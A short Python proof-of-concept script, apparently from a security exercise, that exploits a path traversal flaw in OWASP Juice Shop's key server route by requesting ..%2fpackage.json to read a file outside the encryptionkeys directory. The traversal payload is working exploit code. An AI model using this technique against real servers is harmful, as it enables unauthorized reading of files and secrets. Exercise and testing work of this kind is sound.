"""Path traversal through the file name in routes/keyServer.ts.

Asks /encryptionkeys/ for ../package.json (the slash URL-encoded so it stays in
the :file parameter). Success: the response is Juice Shop's package.json, a
file outside encryptionkeys/.
"""

import urllib.error
import urllib.request


def exploit(base: str) -> tuple[bool, str]:
    try:
        with urllib.request.urlopen(f"{base}/encryptionkeys/..%2fpackage.json") as res:
            body = res.read().decode("utf-8", "replace")
            return '"name": "juice-shop"' in body, f"HTTP {res.status}"
    except urllib.error.HTTPError as err:
        return False, f"HTTP {err.code}"
